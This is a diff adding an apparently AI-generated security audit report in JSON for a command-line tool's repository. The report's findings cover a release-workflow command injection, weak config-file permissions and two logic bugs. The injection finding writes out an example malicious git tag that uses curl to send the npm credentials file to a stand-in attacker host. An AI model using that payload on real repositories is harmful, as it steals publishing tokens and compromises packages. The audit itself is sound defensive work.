@@ -1,0 +1,609 @@
+{
+  "projectId": "cli",
+  "generatedAt": "2026-05-18T13:32:27.437Z",
+  "runId": null,
+  "summary": {
+    "filesAnalyzed": 16,
+    "totalFindings": 4,
+    "critical": 0,
+    "high": 1,
+    "medium": 1,
+    "highBug": 0,
+    "bug": 2
+  },
+  "files": [
+    {
+      "filePath": ".env",
+      "findings": [],
+      "analysisHistory": [
+        {
+          "runId": "20260518132805-a5fd1949eb744d8b",
+          "investigatedAt": "2026-05-18T13:31:02.512Z",
+          "durationMs": 42587,
+          "durationApiMs": 39632,
+          "agentType": "claude-agent-sdk",
+          "model": "claude-opus-4-7",
+          "modelConfig": {
+            "model": "claude-opus-4-7"
+          },
+          "agentSessionId": "8b108fcb-9c4d-457d-a3e3-cea3f3a470cf",
+          "findingCount": 0,
+          "numTurns": 2.25,
+          "phase": "process",
+          "costUsd": 0.17684918750000003,
+          "usage": {
+            "inputTokens": 3,
+            "outputTokens": 2741.25,
+            "cacheReadInputTokens": 53677.75,
+            "cacheCreationInputTokens": 13034.25
+          },
+          "refusal": {
+            "refused": false,
+            "skipped": [],
+            "raw": "```json\n{\"refused\": false, \"reason\": null, \"skipped\": []}\n```"
+          }
+        }
+      ]
+    },
+    {
+      "filePath": ".github/workflows/ci.yml",
+      "findings": [],
+      "analysisHistory": [
+        {
+          "runId": "20260518132805-a5fd1949eb744d8b",
+          "investigatedAt": "2026-05-18T13:32:16.392Z",
+          "durationMs": 80847.33333333333,
+          "durationApiMs": 77802,
+          "agentType": "claude-agent-sdk",
+          "model": "claude-opus-4-7",
+          "modelConfig": {
+            "model": "claude-opus-4-7"
+          },
+          "agentSessionId": "2987151b-22c8-4aa8-97b4-670c195142f6",
+          "findingCount": 0,
+          "numTurns": 2.3333333333333335,
+          "phase": "process",
+          "costUsd": 0.29499000000000003,
+          "usage": {
+            "inputTokens": 2.6666666666666665,
+            "outputTokens": 5766.666666666667,
+            "cacheReadInputTokens": 45820,
+            "cacheCreationInputTokens": 20464
+          },
+          "refusal": {
+            "refused": false,
+            "skipped": [],
+            "raw": "```json\n{\"refused\": false, \"reason\": null, \"skipped\": []}\n```"
+          }
+        }
+      ]
+    },
+    {
+      "filePath": ".github/workflows/release.yml",
+      "findings": [
+        {
+          "severity": "HIGH",
+          "vulnSlug": "github-workflow-security",
+          "title": "Command injection in release workflow via attacker-controlled git tag name (supply-chain RCE)",
+          "description": "The `publish` job interpolates tag-derived GitHub Actions expressions directly into multi-line `run:` shell scripts. L79 `CURRENT_TAG=${{ github.ref_name }}` injects the raw tag name, and L55/L82 `TAG_VERSION=${{ steps.version.outputs.version }}` / `VERSION=${{ steps.version.outputs.version }}` inject the `version` step output which is derived at L49 from the tag itself (`VERSION=${GITHUB_REF#refs/tags/v}`). Actions performs `${{ }}` substitution textually BEFORE the shell runs, so the tag name becomes literal shell source. Git ref-naming rules forbid spaces and a few metacharacters but PERMIT `;`, `$`, backtick, `(`, `)`, `|`, `&`, `{`, `}`, `<`, `>`. A tag such as `v1.0.0;curl${IFS}-d@$HOME/.npmrc${IFS}evil.com` (or backtick/`$()` variants, using `${IFS}` to avoid spaces) yields `CURRENT_TAG=v1.0.0;curl ... evil.com`, executing arbitrary commands. The `publish` job holds `id-token: write` (npm OIDC trusted publishing), `contents: write`, and environment access to `secrets.TEST_TOKEN` and `secrets.GITHUB_TOKEN`. Arbitrary code execution here means an attacker can publish a malicious `@formo/cli` to npm, exfiltrate the OIDC-minted npm publish token and `GITHUB_TOKEN`, and tamper with releases — a full supply-chain compromise of a published package. The earlier 'Verify tag is on main branch' step only checks `github.sha` ancestry (a hex SHA, not injectable) and does NOT validate the tag NAME, so it does not mitigate this: an attacker can point a maliciously-named tag at a legitimate main commit and the guard still passes. Precondition: ability to push/create a tag (repository write access; default GitHub has no tag-protection). This is a privilege escalation from 'write access' to 'arbitrary npm publish + OIDC/secret exfiltration', and is the canonical GitHub Actions script-injection anti-pattern (CWE-78) that GitHub explicitly warns against.",
+          "lineNumbers": [
+            49,
+            55,
+            79,
+            82
+          ],
+          "recommendation": "Never interpolate `${{ github.ref_name }}` or any tag/ref-derived value (including `steps.version.outputs.version`, which is computed from the tag) directly into a `run:` block. Pass them through the step's `env:` map and reference them as quoted shell variables, e.g.:\n\n  - name: Generate release notes\n    env:\n      CURRENT_TAG: ${{ github.ref_name }}\n      VERSION: ${{ steps.version.outputs.version }}\n    run: |\n      PREV_TAG=$(git tag -l 'v*' --sort=-version:refname | grep -v \"^${CURRENT_TAG}$\" | head -1)\n\nDo the same for the `TAG_VERSION` usage at L55. Environment-variable values are not re-parsed as shell, so injection is prevented. Additionally, harden the version regex (e.g. validate `github.ref_name` matches `^v[0-9]+\\.[0-9]+\\.[0-9]+([.-][0-9A-Za-z.]+)?$` and `exit 1` otherwise before any other step), and enable GitHub tag protection rules so only trusted maintainers can create `v*` tags.",
+          "confidence": "high",
+          "producedByRunId": "20260518132805-a5fd1949eb744d8b"
+        }
+      ],
+      "analysisHistory": [
+        {
+          "runId": "20260518132805-a5fd1949eb744d8b",
+          "investigatedAt": "2026-05-18T13:32:16.485Z",
+          "durationMs": 80847.33333333333,
+          "durationApiMs": 77802,
+          "agentType": "claude-agent-sdk",
+          "model": "claude-opus-4-7",
+          "modelConfig": {
+            "model": "claude-opus-4-7"
+          },
+          "agentSessionId": "2987151b-22c8-4aa8-97b4-670c195142f6",
+          "findingCount": 1,
+          "numTurns": 2.3333333333333335,
+          "phase": "process",
+          "costUsd": 0.29499000000000003,
+          "usage": {
+            "inputTokens": 2.6666666666666665,
+            "outputTokens": 5766.666666666667,
+            "cacheReadInputTokens": 45820,
+            "cacheCreationInputTokens": 20464
+          },
+          "refusal": {
+            "refused": false,
+            "skipped": [],
+            "raw": "```json\n{\"refused\": false, \"reason\": null, \"skipped\": []}\n```"
+          }
+        }
+      ]
+    },
+    {
+      "filePath": "src/commands/alerts.ts",
+      "findings": [],
+      "analysisHistory": [
+        {
+          "runId": "20260518132805-a5fd1949eb744d8b",
+          "investigatedAt": "2026-05-18T13:30:45.062Z",
+          "durationMs": 30415.8,
+          "durationApiMs": 28011,
+          "agentType": "claude-agent-sdk",
+          "model": "claude-opus-4-7",
+          "modelConfig": {
+            "model": "claude-opus-4-7"
+          },
+          "agentSessionId": "002e479b-3054-4173-85cd-120252954fd4",
+          "findingCount": 0,
+          "numTurns": 2.2,
+          "phase": "process",
+          "costUsd": 0.14245805000000003,
+          "usage": {
+            "inputTokens": 2,
+            "outputTokens": 1932.2,
+            "cacheReadInputTokens": 34973.6,
+            "cacheCreationInputTokens": 12265
+          },
+          "refusal": {
+            "refused": false,
+            "skipped": [],
+            "raw": "```json\n{\n  \"refused\": false,\n  \"reason\": null,\n  \"skipped\": []\n}\n```"
+          }
+        }
+      ]
+    },
+    {
+      "filePath": "src/commands/analytics.ts",
+      "findings": [],
+      "analysisHistory": [
+        {
+          "runId": "20260518132805-a5fd1949eb744d8b",
+          "investigatedAt": "2026-05-18T13:30:45.183Z",
+          "durationMs": 30415.8,
+          "durationApiMs": 28011,
+          "agentType": "claude-agent-sdk",
+          "model": "claude-opus-4-7",
+          "modelConfig": {
+            "model": "claude-opus-4-7"
+          },
+          "agentSessionId": "002e479b-3054-4173-85cd-120252954fd4",
+          "findingCount": 0,
+          "numTurns": 2.2,
+          "phase": "process",
+          "costUsd": 0.14245805000000003,
+          "usage": {
+            "inputTokens": 2,
+            "outputTokens": 1932.2,
+            "cacheReadInputTokens": 34973.6,
+            "cacheCreationInputTokens": 12265
+          },
+          "refusal": {
+            "refused": false,
+            "skipped": [],
+            "raw": "```json\n{\n  \"refused\": false,\n  \"reason\": null,\n  \"skipped\": []\n}\n```"
+          }
+        }
+      ]
+    },
+    {
+      "filePath": "src/commands/boards.ts",
+      "findings": [],
+      "analysisHistory": [
+        {
+          "runId": "20260518132805-a5fd1949eb744d8b",
+          "investigatedAt": "2026-05-18T13:30:45.271Z",
+          "durationMs": 30415.8,
+          "durationApiMs": 28011,
+          "agentType": "claude-agent-sdk",
+          "model": "claude-opus-4-7",
+          "modelConfig": {
+            "model": "claude-opus-4-7"
+          },
+          "agentSessionId": "002e479b-3054-4173-85cd-120252954fd4",
+          "findingCount": 0,
+          "numTurns": 2.2,
+          "phase": "process",
+          "costUsd": 0.14245805000000003,
+          "usage": {
+            "inputTokens": 2,
+            "outputTokens": 1932.2,
+            "cacheReadInputTokens": 34973.6,
+            "cacheCreationInputTokens": 12265
+          },
+          "refusal": {
+            "refused": false,
+            "skipped": [],
+            "raw": "```json\n{\n  \"refused\": false,\n  \"reason\": null,\n  \"skipped\": []\n}\n```"
+          }
+        }
+      ]
+    },
+    {
+      "filePath": "src/commands/charts.ts",
+      "findings": [],
+      "analysisHistory": [
+        {
+          "runId": "20260518132805-a5fd1949eb744d8b",
+          "investigatedAt": "2026-05-18T13:30:45.351Z",
+          "durationMs": 30415.8,
+          "durationApiMs": 28011,
+          "agentType": "claude-agent-sdk",
+          "model": "claude-opus-4-7",
+          "modelConfig": {
+            "model": "claude-opus-4-7"
+          },
+          "agentSessionId": "002e479b-3054-4173-85cd-120252954fd4",
+          "findingCount": 0,
+          "numTurns": 2.2,
+          "phase": "process",
+          "costUsd": 0.14245805000000003,
+          "usage": {
+            "inputTokens": 2,
+            "outputTokens": 1932.2,
+            "cacheReadInputTokens": 34973.6,
+            "cacheCreationInputTokens": 12265
+          },
+          "refusal": {
+            "refused": false,
+            "skipped": [],
+            "raw": "```json\n{\n  \"refused\": false,\n  \"reason\": null,\n  \"skipped\": []\n}\n```"
+          }
+        }
+      ]
+    },
+    {
+      "filePath": "src/commands/contracts.ts",
+      "findings": [],
+      "analysisHistory": [
+        {
+          "runId": "20260518132805-a5fd1949eb744d8b",
+          "investigatedAt": "2026-05-18T13:30:45.432Z",
+          "durationMs": 30415.8,
+          "durationApiMs": 28011,
+          "agentType": "claude-agent-sdk",
+          "model": "claude-opus-4-7",
+          "modelConfig": {
+            "model": "claude-opus-4-7"
+          },
+          "agentSessionId": "002e479b-3054-4173-85cd-120252954fd4",
+          "findingCount": 0,
+          "numTurns": 2.2,
+          "phase": "process",
+          "costUsd": 0.14245805000000003,
+          "usage": {
+            "inputTokens": 2,
+            "outputTokens": 1932.2,
+            "cacheReadInputTokens": 34973.6,
+            "cacheCreationInputTokens": 12265
+          },
+          "refusal": {
+            "refused": false,
+            "skipped": [],
+            "raw": "```json\n{\n  \"refused\": false,\n  \"reason\": null,\n  \"skipped\": []\n}\n```"
+          }
+        }
+      ]
+    },
+    {
+      "filePath": "src/commands/import.ts",
+      "findings": [],
+      "analysisHistory": [
+        {
+          "runId": "20260518132805-a5fd1949eb744d8b",
+          "investigatedAt": "2026-05-18T13:30:11.755Z",
+          "durationMs": 29793.75,
+          "durationApiMs": 27449,
+          "agentType": "claude-agent-sdk",
+          "model": "claude-opus-4-7",
+          "modelConfig": {
+            "model": "claude-opus-4-7"
+          },
+          "agentSessionId": "73190721-9d83-413f-9748-88626d00f584",
+          "findingCount": 0,
+          "numTurns": 2,
+          "phase": "process",
+          "costUsd": 0.1443679375,
+          "usage": {
+            "inputTokens": 1.5,
+            "outputTokens": 2118.75,
+            "cacheReadInputTokens": 20086.5,
+            "cacheCreationInputTokens": 13015.75
+          },
+          "refusal": {
+            "refused": false,
+            "skipped": [],
+            "raw": "```json\n{\n  \"refused\": false,\n  \"reason\": null,\n  \"skipped\": []\n}\n```"
+          }
+        }
+      ]
+    },
+    {
+      "filePath": "src/commands/profiles.ts",
+      "findings": [
+        {
+          "severity": "BUG",
+          "vulnSlug": "other-logic-bug",
+          "title": "HTTP GET issued with a request body for profile search conditions",
+          "description": "searchProfilesRun() sends the validated `--conditions`/`--logic` payload as the body of a GET request: `client.request({ method: 'get', url: '/v0/profiles/', params, data: body })`. Bodies on GET requests are not reliably transmitted — axios sends them, but many HTTP intermediaries, proxies, and server frameworks strip or ignore GET request bodies. If the body is dropped anywhere along the path, the filter conditions are silently discarded and the endpoint returns the entire unfiltered profile dataset. This is exactly the silent-unfiltered-result footgun that parseSearchConditions()'s own comments (lines 52-55, 96-98) go to great lengths to prevent for bare field names. Not a security vulnerability (data is the caller's own project data under their own scoped key), but a correctness/cost concern: a user believing they filtered to a small result set may instead page through the full dataset. Low confidence because it depends on api.formo.so and the transport actually honoring GET bodies, which cannot be verified from the client code alone.",
+          "lineNumbers": [
+            124
+          ],
+          "recommendation": "Either send the conditions payload via POST (e.g. a dedicated search endpoint) or confirm api.formo.so reliably reads GET bodies. If the GET-with-body contract is intentional and supported end-to-end, document it explicitly so future maintainers do not 'fix' it.",
+          "confidence": "low",
+          "producedByRunId": "20260518132805-a5fd1949eb744d8b"
+        }
+      ],
+      "analysisHistory": [
+        {
+          "runId": "20260518132805-a5fd1949eb744d8b",
+          "investigatedAt": "2026-05-18T13:30:11.873Z",
+          "durationMs": 29793.75,
+          "durationApiMs": 27449,
+          "agentType": "claude-agent-sdk",
+          "model": "claude-opus-4-7",
+          "modelConfig": {
+            "model": "claude-opus-4-7"
+          },
+          "agentSessionId": "73190721-9d83-413f-9748-88626d00f584",
+          "findingCount": 1,
+          "numTurns": 2,
+          "phase": "process",
+          "costUsd": 0.1443679375,
+          "usage": {
+            "inputTokens": 1.5,
+            "outputTokens": 2118.75,
+            "cacheReadInputTokens": 20086.5,
+            "cacheCreationInputTokens": 13015.75
+          },
+          "refusal": {
+            "refused": false,
+            "skipped": [],
+            "raw": "```json\n{\n  \"refused\": false,\n  \"reason\": null,\n  \"skipped\": []\n}\n```"
+          }
+        }
+      ]
+    },
+    {
+      "filePath": "src/commands/query.ts",
+      "findings": [],
+      "analysisHistory": [
+        {
+          "runId": "20260518132805-a5fd1949eb744d8b",
+          "investigatedAt": "2026-05-18T13:30:11.964Z",
+          "durationMs": 29793.75,
+          "durationApiMs": 27449,
+          "agentType": "claude-agent-sdk",
+          "model": "claude-opus-4-7",
+          "modelConfig": {
+            "model": "claude-opus-4-7"
+          },
+          "agentSessionId": "73190721-9d83-413f-9748-88626d00f584",
+          "findingCount": 0,
+          "numTurns": 2,
+          "phase": "process",
+          "costUsd": 0.1443679375,
+          "usage": {
+            "inputTokens": 1.5,
+            "outputTokens": 2118.75,
+            "cacheReadInputTokens": 20086.5,
+            "cacheCreationInputTokens": 13015.75
+          },
+          "refusal": {
+            "refused": false,
+            "skipped": [],
+            "raw": "```json\n{\n  \"refused\": false,\n  \"reason\": null,\n  \"skipped\": []\n}\n```"
+          }
+        }
+      ]
+    },
+    {
+      "filePath": "src/commands/segments.ts",
+      "findings": [
+        {
+          "severity": "BUG",
+          "vulnSlug": "other-input-validation",
+          "title": "buildCreateSegmentBody does not validate that --filter-sets is an array",
+          "description": "buildCreateSegmentBody() does `JSON.parse(options.filterSets)` and forwards the result unchanged, but never checks `Array.isArray(parsedFilterSets)`. Both the catch-block error message ('--filter-sets must be a valid JSON array') and the Zod option description ('JSON array of filter set strings defining the segment') promise array validation that the code does not perform. Inputs like `--filter-sets '{\"x\":1}'`, `--filter-sets '5'`, or `--filter-sets '\"foo\"'` are valid JSON and therefore pass client-side validation, sending a malformed `filterSets` shape to POST /v0/segments/. This is inconsistent with the sibling validator buildImportBody() in import.ts (lines 19-21), which correctly rejects non-arrays. Not a security issue — the server enforces the real schema under the segments:write scope — but the misleading error message degrades the CLI/agent UX and can mask the actual cause of a server rejection.",
+          "lineNumbers": [
+            32,
+            33,
+            34,
+            35,
+            36,
+            37,
+            38,
+            42
+          ],
+          "recommendation": "After JSON.parse, add `if (!Array.isArray(parsedFilterSets)) throw new Error('--filter-sets must be a valid JSON array')`, mirroring buildImportBody() in import.ts, so the validation matches the documented contract.",
+          "confidence": "high",
+          "producedByRunId": "20260518132805-a5fd1949eb744d8b"
+        }
+      ],
+      "analysisHistory": [
+        {
+          "runId": "20260518132805-a5fd1949eb744d8b",
+          "investigatedAt": "2026-05-18T13:30:12.075Z",
+          "durationMs": 29793.75,
+          "durationApiMs": 27449,
+          "agentType": "claude-agent-sdk",
+          "model": "claude-opus-4-7",
+          "modelConfig": {
+            "model": "claude-opus-4-7"
+          },
+          "agentSessionId": "73190721-9d83-413f-9748-88626d00f584",
+          "findingCount": 1,
+          "numTurns": 2,
+          "phase": "process",
+          "costUsd": 0.1443679375,
+          "usage": {
+            "inputTokens": 1.5,
+            "outputTokens": 2118.75,
+            "cacheReadInputTokens": 20086.5,
+            "cacheCreationInputTokens": 13015.75
+          },
+          "refusal": {
+            "refused": false,
+            "skipped": [],
+            "raw": "```json\n{\n  \"refused\": false,\n  \"reason\": null,\n  \"skipped\": []\n}\n```"
+          }
+        }
+      ]
+    },
+    {
+      "filePath": "src/index.ts",
+      "findings": [],
+      "analysisHistory": [
+        {
+          "runId": "20260518132805-a5fd1949eb744d8b",
+          "investigatedAt": "2026-05-18T13:32:16.245Z",
+          "durationMs": 80847.33333333333,
+          "durationApiMs": 77802,
+          "agentType": "claude-agent-sdk",
+          "model": "claude-opus-4-7",
+          "modelConfig": {
+            "model": "claude-opus-4-7"
+          },
+          "agentSessionId": "2987151b-22c8-4aa8-97b4-670c195142f6",
+          "findingCount": 0,
+          "numTurns": 2.3333333333333335,
+          "phase": "process",
+          "costUsd": 0.29499000000000003,
+          "usage": {
+            "inputTokens": 2.6666666666666665,
+            "outputTokens": 5766.666666666667,
+            "cacheReadInputTokens": 45820,
+            "cacheCreationInputTokens": 20464
+          },
+          "refusal": {
+            "refused": false,
+            "skipped": [],
+            "raw": "```json\n{\"refused\": false, \"reason\": null, \"skipped\": []}\n```"
+          }
+        }
+      ]
+    },
+    {
+      "filePath": "src/lib/client.ts",
+      "findings": [],
+      "analysisHistory": [
+        {
+          "runId": "20260518132805-a5fd1949eb744d8b",
+          "investigatedAt": "2026-05-18T13:31:02.743Z",
+          "durationMs": 42587,
+          "durationApiMs": 39632,
+          "agentType": "claude-agent-sdk",
+          "model": "claude-opus-4-7",
+          "modelConfig": {
+            "model": "claude-opus-4-7"
+          },
+          "agentSessionId": "8b108fcb-9c4d-457d-a3e3-cea3f3a470cf",
+          "findingCount": 0,
+          "numTurns": 2.25,
+          "phase": "process",
+          "costUsd": 0.17684918750000003,
+          "usage": {
+            "inputTokens": 3,
+            "outputTokens": 2741.25,
+            "cacheReadInputTokens": 53677.75,
+            "cacheCreationInputTokens": 13034.25
+          },
+          "refusal": {
+            "refused": false,
+            "skipped": [],
+            "raw": "```json\n{\"refused\": false, \"reason\": null, \"skipped\": []}\n```"
+          }
+        }
+      ]
+    },
+    {
+      "filePath": "src/lib/config.ts",
+      "findings": [
+        {
+          "severity": "MEDIUM",
+          "vulnSlug": "other-insecure-file-permissions",
+          "title": "API-key config file permission control (0o600) silently bypassed when config.json already exists",
+          "description": "saveConfig() persists the plaintext API key with `fs.writeFileSync(CONFIG_FILE, ..., { mode: 0o600 })` and creates the directory with `fs.mkdirSync(CONFIG_DIR, { recursive: true, mode: 0o700 })`. Per Node.js semantics, the `mode` option of `writeFileSync` is applied ONLY when the file is newly created (open with O_CREAT). If `~/.config/formo/config.json` already exists, the mode is NOT re-applied — the file is merely truncated and rewritten while retaining its existing permissions. Likewise, `mkdirSync` does not chmod an already-existing CONFIG_DIR. The codebase's documented threat model ranks 'API-key disclosure via weak config-file perms' as the #1 impact, and the sole stated control for the plaintext-credential store is exactly this `0o600`/`0o700` mode. That control is conditional: it holds only for a clean first creation. Realistic ways the file pre-exists with looser (e.g., 0o644, group/world-readable) permissions before saveConfig runs include: (a) an older `@formo/cli` version that wrote config.json without the `mode` option (default 0o666 & ~umask → typically 0o644); (b) the user or another tool creating the file first; (c) a backup/restore or dotfile-sync tool resetting modes; (d) `EXISTING` config dir created by another app under `~/.config`. In any of these cases `formo login` writes a long-lived `formo_…` API key into a world/group-readable file on a multi-user host, disclosing the credential to other local users — the precise risk the 0o600 control was meant to prevent. clearConfig() (L35-37) has the same create-only-mode limitation (lower impact since it writes `{}`).",
+          "lineNumbers": [
+            26,
+            27,
+            28,
+            29
+          ],
+          "recommendation": "Do not rely on writeFileSync's create-only `mode`. After writing, explicitly enforce permissions: `fs.chmodSync(CONFIG_FILE, 0o600)` (and `fs.chmodSync(CONFIG_DIR, 0o700)`), or write atomically via `fs.openSync(CONFIG_FILE, 'w', 0o600)` followed by `fs.fchmodSync(fd, 0o600)` before writing, then rename. Optionally detect and warn (or refuse) if the existing file/dir has group/other bits set. Apply the same chmod hardening in clearConfig().",
+          "confidence": "medium",
+          "producedByRunId": "20260518132805-a5fd1949eb744d8b"
+        }
+      ],
+      "analysisHistory": [
+        {
+          "runId": "20260518132805-a5fd1949eb744d8b",
+          "investigatedAt": "2026-05-18T13:31:02.829Z",
+          "durationMs": 42587,
+          "durationApiMs": 39632,
+          "agentType": "claude-agent-sdk",
+          "model": "claude-opus-4-7",
+          "modelConfig": {
+            "model": "claude-opus-4-7"
+          },
+          "agentSessionId": "8b108fcb-9c4d-457d-a3e3-cea3f3a470cf",
+          "findingCount": 1,
+          "numTurns": 2.25,
+          "phase": "process",
+          "costUsd": 0.17684918750000003,
+          "usage": {
+            "inputTokens": 3,
+            "outputTokens": 2741.25,
+            "cacheReadInputTokens": 53677.75,
+            "cacheCreationInputTokens": 13034.25
+          },
+          "refusal": {
+            "refused": false,
+            "skipped": [],
+            "raw": "```json\n{\"refused\": false, \"reason\": null, \"skipped\": []}\n```"
+          }
+        }
+      ]
+    },
+    {
+      "filePath": "src/lib/ui.ts",
+      "findings": [],
+      "analysisHistory": [
+        {
+          "runId": "20260518132805-a5fd1949eb744d8b",
+          "investigatedAt": "2026-05-18T13:31:02.648Z",
+          "durationMs": 42587,
+          "durationApiMs": 39632,
+          "agentType": "claude-agent-sdk",
+          "model": "claude-opus-4-7",
+          "modelConfig": {
+            "model": "claude-opus-4-7"
+          },
+          "agentSessionId": "8b108fcb-9c4d-457d-a3e3-cea3f3a470cf",
+          "findingCount": 0,
+          "numTurns": 2.25,
+          "phase": "process",
+          "costUsd": 0.17684918750000003,
+          "usage": {
+            "inputTokens": 3,
+            "outputTokens": 2741.25,
+            "cacheReadInputTokens": 53677.75,
+            "cacheCreationInputTokens": 13034.25
+          },
+          "refusal": {
+            "refused": false,
+            "skipped": [],
+            "raw": "```json\n{\"refused\": false, \"reason\": null, \"skipped\": []}\n```"
+          }
+        }
+      ]
+    }
+  ]
+}
